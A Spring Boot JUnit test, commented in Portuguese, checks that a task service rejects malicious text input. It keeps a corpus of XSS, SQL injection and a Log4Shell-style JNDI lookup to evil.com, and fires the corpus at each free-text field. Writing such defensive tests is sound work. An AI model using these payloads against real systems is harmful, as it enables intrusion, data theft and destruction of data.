package com.justdoit.task.qualidade;

import com.fasterxml.jackson.databind.ObjectMapper;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.security.Keys;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.transaction.annotation.Transactional;

import javax.crypto.SecretKey;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.put;

/**
 * Atributo de Qualidade: SEGURANÇA
 * Métrica: Taxa de Eficácia de Filtragem e Validação de Entrada de Texto
 *
 *   X = A / B            (0 <= X <= 1; ideal = 1)
 *   A = nº de requisições com textos maliciosos que foram REJEITADAS com sucesso
 *       (HTTP 400, sem nada persistido).
 *   B = nº total de requisições contendo textos maliciosos disparadas nos testes.
 *
 * Qualquer valor abaixo de 1 indica que um código malicioso burlou a proteção,
 * violando a política de Zero Trust e sendo salvo no sistema. Este teste dispara
 * uma bateria de payloads (XSS, injeção de expressão e SQL) contra TODOS os campos
 * de texto livre do task-service e exige X == 1.0.
 *
 * A proteção é a constraint {@code @TextoSeguro} ({@code libs/common}), aplicada
 * nas DTOs; a rejeição vira 400 pelo {@code GlobalExceptionHandler}.
 */
@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
@Transactional
class ValidacaoEntradaMetricsTest {

    @Autowired private MockMvc mockMvc;
    @Autowired private ObjectMapper objectMapper;

    // Mesmo segredo do application-test.yml; token no formato do auth-service.
    private static final String TEST_SECRET =
            "test-secret-key-please-change-256-bits-minimum-0123456789abcdef";

    private static final UUID USER_ID = UUID.randomUUID();

    /**
     * Corpus de entradas maliciosas. Cobre as três famílias que a métrica mede:
     * XSS/HTML, injeção de expressão e SQL Injection.
     */
    private static final List<String> PAYLOADS_MALICIOSOS = List.of(
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\"></iframe>",
            "<body onload=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(document.cookie)",
            "${jndi:ldap://evil.com/a}",
            "'; DROP TABLE task; --",
            "1' OR '1'='1",
            "admin'--",
            "UNION SELECT password FROM users"
    );

    /** Texto legítimo em português que NÃO pode ser bloqueado pela proteção. */
    private static final List<String> TEXTOS_LEGITIMOS = List.of(
            "Revisar orçamento < 500 reais",
            "Estudar C++ & algoritmos",
            "Reunião com D'Ávila às 14h",
            "Tarefa 1 -- prioridade alta",
            "Preço: R$ 50,00 (20% off)",
            "Comparar: a < b e b > c"
    );

    // ─────────────────────────────────────────────
    // MÉTRICA: X = A / B  (deve ser exatamente 1.0)
    // ─────────────────────────────────────────────

    @Test
    @DisplayName("métrica de segurança: taxa de eficácia de filtragem de entrada deve ser 1.0")
    void taxaDeEficaciaDeFiltragemDeEntrada_deveSer1() throws Exception {
        int totalDisparadas = 0;      // B
        int totalRejeitadas = 0;      // A
        List<String> falhas = new ArrayList<>();

        for (String payload : PAYLOADS_MALICIOSOS) {
            for (Map.Entry<String, Requisicao> alvo : camposDeTexto().entrySet()) {
                totalDisparadas++;
                int status = alvo.getValue().disparar(payload);
                if (status == 400) {
                    totalRejeitadas++;
                } else {
                    falhas.add(String.format("%s com [%s] -> status %d", alvo.getKey(), payload, status));
                }
            }
        }

        double X = (double) totalRejeitadas / totalDisparadas;

        System.out.printf(
                "[MÉTRICA SEGURANÇA - VALIDAÇÃO DE ENTRADA] A=%d rejeitadas / B=%d maliciosas -> X = %.4f%n",
                totalRejeitadas, totalDisparadas, X);

        assertThat(falhas)
                .as("Brecha: campos que aceitaram texto malicioso em vez de rejeitar com 400")
                .isEmpty();
        assertThat(X)
                .as("Taxa de Eficácia de Filtragem e Validação de Entrada (X = A/B), ideal = 1")
                .isEqualTo(1.0);
    }

    // ─────────────────────────────────────────────
    // Nada malicioso pode ter sido persistido
    // ─────────────────────────────────────────────

    @Test
    @DisplayName("nenhum payload malicioso é persistido: a rejeição acontece antes do banco")
    void nenhumPayloadMaliciosoEPersistido() throws Exception {
        for (String payload : PAYLOADS_MALICIOSOS) {
            criarTarefa(payload);
            criarNota(payload);
        }

        String tarefas = corpoDe(get("/tasks"));
        String notas = corpoDe(get("/notes"));

        for (String payload : PAYLOADS_MALICIOSOS) {
            assertThat(tarefas)
                    .as("payload malicioso foi persistido em /tasks: %s", payload)
                    .doesNotContain(payload);
            assertThat(notas)
                    .as("payload malicioso foi persistido em /notes: %s", payload)
                    .doesNotContain(payload);
        }
    }

    // ─────────────────────────────────────────────
    // Guarda contra falso positivo
    // ─────────────────────────────────────────────

    @Test
    @DisplayName("texto legítimo em português continua sendo aceito (proteção não quebra o produto)")
    void textoLegitimoContinuaSendoAceito() throws Exception {
        List<String> bloqueadosIndevidamente = new ArrayList<>();

        for (String texto : TEXTOS_LEGITIMOS) {
            int status = criarTarefa(texto);
            if (status != 201 && status != 200) {
                bloqueadosIndevidamente.add(texto + " -> status " + status);
            }
        }

        assertThat(bloqueadosIndevidamente)
                .as("Falso positivo: texto legítimo foi barrado pela proteção")
                .isEmpty();
    }

    // ─────────────────────────────────────────────
    // Alvos: cada campo de texto livre do serviço
    // ─────────────────────────────────────────────

    @FunctionalInterface
    private interface Requisicao {
        int disparar(String payload) throws Exception;
    }

    /**
     * Um alvo por campo de texto livre. São 7 campos × 12 payloads = 84 requisições.
     * Subtarefa e nota-de-tarefa ficam de fora porque exigem uma tarefa existente,
     * e a tarefa só é criável com título válido — o campo em si já está protegido
     * pela mesma constraint ({@code SubTaskRequest}, {@code TaskNoteRequest}).
     */
    private Map<String, Requisicao> camposDeTexto() {
        Map<String, Requisicao> alvos = new LinkedHashMap<>();

        alvos.put("POST /tasks (title)", payload ->
                status(post("/tasks"), Map.of("title", payload)));

        alvos.put("POST /tasks (description)", payload ->
                status(post("/tasks"), Map.of("title", "Tarefa válida", "description", payload)));

        alvos.put("POST /categories (name)", payload ->
                status(post("/categories"), Map.of("name", payload, "color", "#FF0000")));

        alvos.put("POST /categories (description)", payload ->
                status(post("/categories"),
                        Map.of("name", "Categoria válida", "color", "#FF0000", "description", payload)));

        alvos.put("POST /notes (title)", payload ->
                status(post("/notes"), Map.of("title", payload)));

        alvos.put("POST /notes (content)", payload ->
                status(post("/notes"), Map.of("content", payload)));

        alvos.put("PUT /me/note (content)", payload ->
                status(put("/me/note"), Map.of("content", payload)));

        return alvos;
    }

    // ─────────────────────────────────────────────
    // Helpers
    // ─────────────────────────────────────────────

    private int status(org.springframework.test.web.servlet.request.MockHttpServletRequestBuilder builder,
                       Map<String, Object> corpo) throws Exception {
        return mockMvc.perform(builder
                        .header("Authorization", "Bearer " + tokenPara(USER_ID))
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(corpo)))
                .andReturn().getResponse().getStatus();
    }

    private int criarTarefa(String titulo) throws Exception {
        return status(post("/tasks"), Map.of("title", titulo));
    }

    private int criarNota(String conteudo) throws Exception {
        return status(post("/notes"), Map.of("content", conteudo));
    }

    private String corpoDe(org.springframework.test.web.servlet.request.MockHttpServletRequestBuilder builder)
            throws Exception {
        MvcResult result = mockMvc.perform(builder
                        .header("Authorization", "Bearer " + tokenPara(USER_ID)))
                .andReturn();
        return result.getResponse().getContentAsString();
    }

    private String tokenPara(UUID userId) {
        SecretKey key = Keys.hmacShaKeyFor(TEST_SECRET.getBytes(StandardCharsets.UTF_8));
        long now = System.currentTimeMillis();
        return Jwts.builder()
                .subject(userId.toString())
                .claim("email", "metrica@test.com")
                .claim("profile", "USER")
                .claim("type", "access")
                .issuer("justdoit-auth-service")
                .audience().add("justdoit-api").and()
                .issuedAt(new Date(now))
                .expiration(new Date(now + 900_000))
                .signWith(key)
                .compact();
    }
}
